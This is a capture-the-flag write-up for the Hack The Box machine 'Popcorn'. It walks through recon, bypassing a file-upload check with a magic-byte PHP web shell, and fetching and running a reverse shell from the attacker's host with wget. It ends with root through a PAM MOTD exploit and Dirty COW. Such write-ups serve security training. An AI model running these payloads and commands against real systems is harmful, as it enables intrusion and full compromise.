@@ -1,0 +1,330 @@
+>tmux new -s HTB 
+>openvpn --config hackthebox.ovpn
+>cd ../boxes/popcorn
+
+==Getting a web shell==
+
+>nmap -sV -sC -oA 10.10.10.6
+
+sV: for version
+sC: for saved scripts
+oA: for all formats
+
+Listening  on ports 80 and 22
+Browse to http://10.10.10.6:80 we get the default Apache page
+Fire up Burp and refresh the page with the intercept ON
+Edit the Host header from 10.10.10.6 to popcorn.htb 
+This is test Virtual Host Routing. The web server will look at the header being sent and potentially send us somewhere else
+Forward the request. Nothing happens.
+
+>dirb http://10.10.10.6 -r -o popcorn.dirb
+r: for non-recursive mode
+o: for output file
+
+dirb results:
++ http://popcorn.htb/cgi-bin/
++ http://popcorn.htb/index/
++ http://popcorn.htb/index.html/
++ http://popcorn.htb/server-status/
++ http://popcorn.htb/test/
+==> DIRECTORY: http://popcorn.htb/torrent
+
+May want to dirb the cgi-gin for cgi scripts
+The /test page takes us to php info page tells us where php scripts are cached in the Loaded Modules section which can be exploited vi LFI
+The /torrent linktakes us to a torrent application. 
+
+>searchsploit "torrent hoster"
+
+searchsploit results:
+RemoteUpload Exploit | php/webapps/11746.txt
+
+>searchsploit -x 11746.txt
+x: to view the exploit
+
+Also browse to the Exploit DB page at: 
+https://www.exploit-db.com/exploits/114746
+Note that the date of the exploit is 2010 while the date on the copyright of the torrent app is 2007
+This indicates that the exploit is probably relevant
+
+Going to the uploads page of the torrent app takes us to:
+http://10.10.10.6/torrent/torrents.php?mode=upload
+And the quickly redirects us to a login page at:
+http://10.10.10.6/torrent/login.php
+
+Before attempting a login, turn the Burp intercept on, then try admin / admin and capture the request in Burp:
+
+POST /torrent/login.php HTTP/1.1
+Host: 10.10.10.6
+User-Agent: Mozilla/5.0 (X11; Linux x86; rv:45) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: http://10.10.10.6/torrent/login.php
+Cookie: /torrent/torrents.php=; /torrent/login.php=; /torrent/index.php=; /torrents/torrents.phpfirsttimeload=0; saveit_0=1; /torrent/=;
+PHPSESSIONID=200a119c4720e403b452cd496833cc76
+Connection: close
+Content-Type: application/x-www-form-urlencode
+Content-Length: 29
+
+username=admin&password=admin
+
+Save the whole request into a file (removinf the double spaces):
+>vi login.req
+>Ctrl+Shift+Ins
+>esc:wq!
+
+Run sqlmap using the request
+>sqlmap -r login.req --level 5 --risk 3
+
+While sqlmap runs inthe background, click the Sign Up link on the login page
+Create a dummy account
+Now browse to the upload page again
+Right-click the page's logo and save as an impage for testing an upload
+Upload logo.png gives us the error "This is not a valid torrent file" which tell us there are some file checks going on
+
+Download the Kali Linux torrent file from:
+https://kali.org/downloads
+Upload it 
+Once it uploads, we are redirected to a new page
+Hovering the mouse over the klai-linux-2018.1-amd64 link doesn't reveal a webpath for where it was uploaded. In order to exploit Arbitrary File Upload vulnerabilities, we need to know where the file gets placed onthe server
+So we can try guessing a few common paths like:
+http://10.10.10.6/uploads
+http://10.10.10.6/upload
+
+We see image files (.png) located at:
+http://10.10.10.6/upload
+
+Going back to the uploads page we were redirected to, click "Edit this torrent" in the screenshots section
+Upload the logo.png image from before with Burp still capturing requests
+Refresh the http://10.10.10.6/upload page
+We see our image file successfully uploaded
+
+Try uploading a php script like cmd.php with Burp still capturing requests
+<?php echo system($_REQUEST['cmd']); ?>
+We get an invalid file error
+
+Comparing the two POST requests (cmd.php and logo.png) in Burp we note the following differences:
+CMD.PHP
+Content-Disposition: form-data; name="file"; filename="cmd.php"
+Content-Type: application/x-php
+
+<?php echo system($_REQUEST['cmd']); ?>
+
+LOGO.PNG
+Content-Disposition: form-data; name="file"; filename="logo.png"
+Content-Type: image/png
+
+<some binary data>PNG<some more binary data>
+
+
+Mainly, the file type, mime type, and data all denote PNG. Any or all of these could be getting checked during the upload
+process which means we need to edit the POST of the cmd.php upload request to look the same as below. So send the POST for 
+cmd.php to Burp's Repeater and edit it:
+
+NEW CMD.PHP
+Content-Disposition: form-data; name="file"; filename="cmd.png.php"
+Content-Type: application/x-php
+
+<some binary data>PNG<some more binary data>
+<?php echo system($_REQUEST['cmd']); ?>
+
+For the data part we need to copy a sufficient amount of the image data from the logo.png upload to preface the cmd.php data 
+such that it passes a file check. To do so:
+
+In Burp, highlight a good portion of the beginning of the image data (i.e. where PNG starts)
+Right-click > Convert selection > Base64 > Base64-encode
+Cut the newly added and ecoded Base64 data
+In the terminal:
+>echo <base 64 data here> | base64 -d
+That returns the PNG binary data. Now send to a file so we can check its type
+>echo <base 64 data here> | base64 -d > file
+Check the file type
+>file file
+If the output is file:data then we need to copy more of the PNG image data from the request
+If the output is file: PNG then we have copied enough the pass the file check
+
+These are called the Magic Bytes which are the beginning bytes of a file (the header) which are used by Linux 
+to determine the file's data type whereas Windows uses the file extension.
+Once we have enough image data, submit the POST request.
+
+NEW CMD.PHP
+Content-Disposition: form-data; name="file"; filename="cmd.png.php"
+Content-Type: application/x-php
+
+<Sufficient amount of binary data>PNG<Sufficient amount of binary data>
+<?php echo system($_REQUEST['cmd']); ?>
+
+We get an HTTP 200 OK response with the message "Upload Complete"
+Going back to the upload directory: http://10.10.10.6/upload and refreshing shows us our malicious file has been uploaded
+Clicking it takes us to our webshell:
+http://10.10.10.6/torrent/upload/4c3235abe5dd89d75c2c4768536fbc29e85aa324.php
+
+We get a php error: "Cannot execute a blank command" which idicates our webshell was evaluated without a command as expected
+Pass in a command as such:
+http://10.10.10.6/torrent/upload/4c3235abe5dd89d75c2c4768536fbc29e85aa324.php?cmd=whoami
+Which yields:
+<bunch of garbled binary>www-data-www-data
+
+So we have a successful webshell.
+
+==Getting a reverse shell==
+
+We will get a reverse python pty shell from this github page:
+https://github.com/infodox/python-pty-shells
+
+We want to use: tcp_pty_backconnect.py
+Download the shell to the local Kali machine
+Edit the lhost and lport values to the local Kalie machine's ip and port of choosing
+Host it on a local web server by running below command from the same directory where the file exists in Kali:
+python -m SimpleHTTPServer 8000
+
+Back in the webshell refresh the page toi capture the request in Burp
+Send it to the Repeater
+In Repeater, Right-click > change request method 
+It is now convereted from a GET to a POST request:
+
+POST http://10.10.10.6/torrent/upload/4c3235abe5dd89d75c2c4768536fbc29e85aa324.php HTTP/1.1
+Host: 10.10.10.6
+User-Agent: Mozilla/5.0 (X11; Linux x86; rv:45) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: http://10.10.10.6/torrent/login.php
+Cookie: /torrent/torrents.php=; /torrent/login.php=; /torrent/index.php=; /torrents/torrents.phpfirsttimeload=0; saveit_0=1; /torrent/=;
+PHPSESSIONID=200a119c4720e403b452cd496833cc76
+Connection: close
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencode
+Content-Length: 29
+
+cmd=whoami
+
+Change the command in the POST to:
+wget <kali ip>:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
+
+POST http://10.10.10.6/torrent/upload/4c3235abe5dd89d75c2c4768536fbc29e85aa324.php HTTP/1.1
+Host: 10.10.10.6
+User-Agent: Mozilla/5.0 (X11; Linux x86; rv:45) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: http://10.10.10.6/torrent/login.php
+Cookie: /torrent/torrents.php=; /torrent/login.php=; /torrent/index.php=; /torrents/torrents.phpfirsttimeload=0; saveit_0=1; /torrent/=;
+PHPSESSIONID=200a119c4720e403b452cd496833cc76
+Connection: close
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencode
+Content-Length: 29
+
+cmd=wget <kali ip>:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
+
+
+Where /dev/shm is just RAM and therefore not actually saving the file to the harddrive
+Submit the request
+Verify by cat-ing the contents:
+
+POST http://10.10.10.6/torrent/upload/4c3235abe5dd89d75c2c4768536fbc29e85aa324.php HTTP/1.1
+Host: 10.10.10.6
+User-Agent: Mozilla/5.0 (X11; Linux x86; rv:45) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: http://10.10.10.6/torrent/login.php
+Cookie: /torrent/torrents.php=; /torrent/login.php=; /torrent/index.php=; /torrents/torrents.phpfirsttimeload=0; saveit_0=1; /torrent/=;
+PHPSESSIONID=200a119c4720e403b452cd496833cc76
+Connection: close
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencode
+Content-Length: 29
+
+cmd=cat /dev/shm/.rev.py
+
+Set up a listener on the Kali machine to catch the shell:
+>python tcp_pty_shell_handler.py -b <ip of local Kali>:4444
+
+Execute the reverse shell now from Burp:
+
+POST http://10.10.10.6/torrent/upload/4c3235abe5dd89d75c2c4768536fbc29e85aa324.php HTTP/1.1
+Host: 10.10.10.6
+User-Agent: Mozilla/5.0 (X11; Linux x86; rv:45) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: http://10.10.10.6/torrent/login.php
+Cookie: /torrent/torrents.php=; /torrent/login.php=; /torrent/index.php=; /torrents/torrents.phpfirsttimeload=0; saveit_0=1; /torrent/=;
+PHPSESSIONID=200a119c4720e403b452cd496833cc76
+Connection: close
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencode
+Content-Length: 29
+
+cmd=python /dev/shm/.rev.py
+
+We catch our reverse shell!
+
+==Privilege Escalation==
+
+First get theuser flag
+>find /home -type f -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null | column -t
+>cat /home/george/user.txt
+
+In the results, also notice the motd.legal-displayed file which is unusual for the HTB machines
+>uname -a
+Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
+
+The kernel is from 2009 which tells us it's vulnerable to Dirty Cow exploit
+Looking into motd
+>searchsploit motd
+
+Searchsploit results:
+Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (1)
+Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2)
+
+Checking version of PAM on the box:
+>dpkg -l | grep -i pam
+ii libpam0g 1.1.0-2ubuntu1  Pluggable Authentication Modules libray
+So it is vulnerable against the searchsploit result
+
+>searchsploit -x 14339.sh
+Copy it to clipboard
+>cat /usr/sahre/exploitdb/platforms/linux/local/14339.sh | xclip
+
+In the popcorn shell, create the exploit file:
+>vi priv.sh
+>esc:wq!
+
+Alternatively, you can also host the exploit file on local Kali web server and wget it from the popcorn shell i.e.
+
+create file, priv.sh, on kali mahchine
+From same directory run:
+>python -m SimpleHTTPServer 8000
+And then from popcorn shell:
+>wget <kali ip>:8000/priv.sh
+
+Sometimes one works when the other doesn't
+Execute the exploit on popcorn:
+>bash priv.sh
+Enter the password "toor" to get the root shell
+
+
+==Privilege Escalation via Dirty Cow==
+Get a copy of the Dirty Cow exploit from:
+https://dirtycow.ninja
+Click on View Exploits
+Grab a copy of dirty.c
+Check version of gcc on popcorn
+>which gcc
+Paste the contents and save
+>vi dirty.c
+>esc:wq!
+Compile
+>gcc -pthread dirty.c -o dirty -lcrypt
+Make it executable
+>chmod +x dirty
+Execute it
+>./dirty
+Enter a password: 
+User firefart created with the password
+Switch to the user firefart
+>su firefart
+Enter the password
+>id
+We are root
+>cat root.txt
+
+
